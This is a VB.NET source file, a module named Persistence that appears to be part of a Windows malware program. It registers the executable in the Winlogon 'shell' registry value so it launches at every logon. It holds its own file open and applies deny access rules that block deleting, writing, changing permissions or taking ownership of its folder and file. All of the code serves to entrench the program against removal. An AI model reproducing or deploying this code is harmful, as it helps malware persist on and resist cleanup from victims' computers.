Imports System.Security.AccessControl
Imports System.IO
Imports Microsoft.Win32
Imports System.Security.Principal

Module Persistence
    Dim WriteKey As Boolean = False
    Public Sub Startup()

        On Error Resume Next
        ProtectFolder(InstallationOfEverything)


        Dim Fuckyou As RegistryKey
        Fuckyou = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows NT\CurrentVersion\Winlogon\", True)
        Fuckyou.SetValue("shell", "explorer.exe," & """" & Application.ExecutablePath & """")
        Fuckyou.Close()


        If WriteKey = False Then
            WriteKey = True
            Threading.Thread.Sleep(1000)
            FileOpen(1, Application.ExecutablePath, OpenMode.Input, OpenAccess.Default, OpenShare.LockReadWrite)
        End If

        ProtectTheFile(Application.ExecutablePath)



    End Sub

    Public Sub AllowAccess(ByVal location As String)
        Try
            Dim FolderPath As String = location
            Dim FolderInfo As IO.DirectoryInfo = New IO.DirectoryInfo(FolderPath)
            Dim FolderAcl As New DirectorySecurity
            FolderAcl.SetAccessRuleProtection(False, True)
            FolderInfo.SetAccessControl(FolderAcl)
        Catch : End Try
    End Sub
    Public Sub ProtectFolder(ByVal location As String)
        Try
            Dim FolderPath As String = location 'Specify the folder here
            Dim UserAccount As String = "EVERYONE" 'Specify the user here
            Dim FolderInfo As IO.DirectoryInfo = New IO.DirectoryInfo(FolderPath)
            Dim FolderAcl As New DirectorySecurity

            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.ReadAttributes, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.CreateDirectories, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.WriteAttributes, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.WriteExtendedAttributes, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.Delete, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.DeleteSubdirectoriesAndFiles, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.ChangePermissions, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.TakeOwnership, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.SetAccessRuleProtection(False, True)
            FolderInfo.SetAccessControl(FolderAcl)
        Catch
        End Try
    End Sub
    Public Sub ProtectTheFile(ByVal location As String)
        Try
            Dim FolderPath As String = location 'Specify the folder here
            Dim UserAccount As String = Environment.UserName.ToString 'Specify the user here
            Dim FolderInfo As IO.DirectoryInfo = New IO.DirectoryInfo(FolderPath)
            Dim FolderAcl As New DirectorySecurity
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.Read, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.ReadAndExecute, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.Delete, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.Write, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.ChangePermissions, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.TakeOwnership, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.WriteAttributes, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.WriteExtendedAttributes, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.ListDirectory, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow))
            FolderInfo.SetAccessControl(FolderAcl)
        Catch
        End Try
    End Sub
End Module
